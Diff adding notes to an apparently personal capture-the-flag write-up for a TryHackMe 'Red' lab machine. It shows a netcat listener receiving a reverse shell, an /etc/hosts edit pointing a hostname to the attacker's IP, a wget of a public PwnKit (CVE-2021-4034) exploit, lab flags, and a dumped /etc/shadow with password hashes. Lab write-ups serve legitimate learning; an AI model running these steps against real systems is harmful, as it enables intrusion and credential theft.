@@ -191,3 +191,120 @@ THM{Is_thAt_all_y0u_can_d0_blU3?}
 
 ![[Pasted image 20230716140044.png]]
 
+**17072023Mon**
+
+![[Pasted image 20230717145223.png]]
+
+```
+blue@red:~$ There is no way you are going to own this machine
+No you are repeating yourself, you are repeating yourself
+There is no way you are going to own this machine
+Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run Pspy? Yawn
+Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run Pspy? Yawn
+Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==
+Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue.
+Get out of my machine Blue!!
+Say Bye Bye to your Shell Blue and that password
+Connection to 10.10.152.14 closed by remote host.
+Connection to 10.10.152.14 closed.
+```
+
+```
+echo 'WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==' |base64 -d
+```
+
+*You really suck at this Blue*
+
+```
+/usr/bin/echo "10.17.44.152 redrules.thm" | tee -a /etc/hosts
+```
+
+![[Pasted image 20230717150516.png]]
+
+![[Pasted image 20230717151603.png]]
+
+![[Pasted image 20230717151937.png]]
+
+```
+nc -nlvp 9001                                     
+listening on [any] 9001 ...
+connect to [10.17.44.152] from (UNKNOWN) [10.10.152.14] 59030
+bash: cannot set terminal process group (2887): Inappropriate ioctl for device
+bash: no job control in this shell
+red@red:~$ cat flag2.txt
+cat flag2.txt
+cat: flag2.txt: No such file or directory
+red@red:~$ cat flag2
+cat flag2
+THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
+red@red:~$ 
+```
+
+![[Pasted image 20230717152000.png]]
+
+![[Pasted image 20230717152124.png]]
+
+```
+find / -type f -name flag3 2>/dev/null
+```
+
+![[Pasted image 20230717152326.png]]
+
+![[Pasted image 20230717153008.png]]
+
+![[Pasted image 20230717153154.png]]
+
+```
+wget -c https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
+```
+
+![[Pasted image 20230717154131.png]]
+![[Pasted image 20230717154159.png]]
+
+![[Pasted image 20230717154514.png]]
+
+![[Pasted image 20230717155229.png]]
+
+```
+THM{Go0d_Gam3_Blu3_GG}
+```
+
+```
+cat /etc/shadow
+root:$6$UOVHBYFDzdwI2p1g$vu3yeAN8uBeiibQbM3f8ijWuLsoEe.uuSjMUv8Y2K2KcAUpoVINYplpLgv4J5N/3bGVegml57cAGDZ1yKx9cY0:19217:0:99999:7:::
+daemon:*:19046:0:99999:7:::
+bin:*:19046:0:99999:7:::
+sys:*:19046:0:99999:7:::
+sync:*:19046:0:99999:7:::
+games:*:19046:0:99999:7:::
+man:*:19046:0:99999:7:::
+lp:*:19046:0:99999:7:::
+mail:*:19046:0:99999:7:::
+news:*:19046:0:99999:7:::
+uucp:*:19046:0:99999:7:::
+proxy:*:19046:0:99999:7:::
+www-data:*:19046:0:99999:7:::
+backup:*:19046:0:99999:7:::
+list:*:19046:0:99999:7:::
+irc:*:19046:0:99999:7:::
+gnats:*:19046:0:99999:7:::
+nobody:*:19046:0:99999:7:::
+systemd-network:*:19046:0:99999:7:::
+systemd-resolve:*:19046:0:99999:7:::
+systemd-timesync:*:19046:0:99999:7:::
+messagebus:*:19046:0:99999:7:::
+syslog:*:19046:0:99999:7:::
+_apt:*:19046:0:99999:7:::
+tss:*:19046:0:99999:7:::
+uuidd:*:19046:0:99999:7:::
+tcpdump:*:19046:0:99999:7:::
+landscape:*:19046:0:99999:7:::
+pollinate:*:19046:0:99999:7:::
+usbmux:*:19217:0:99999:7:::
+sshd:*:19217:0:99999:7:::
+systemd-coredump:!!:19217::::::
+blue:$6$Rv9WN31PMJzrpa5C$1ZbcoxD..JnsJgL3xwJK6VzGcvyaU.eszUzqSK2CBMoUfTwxs5SRwsiItWTKpcoMtrIsdcbofWgIF0i0Oc0G..:19555:0:99999:7:::
+lxd:!:19217::::::
+red:$6$9N2RSdHqESRVzXne$9ZbaIFsBgC726dRaR3R/RBG/PxTCXLulc26Uxz34b7nmiiLT2VeMFL9rEvSdxFw4EZuxyw1ewxld0hYtsD4fM0:19218:0:99999:7:::
+```
+
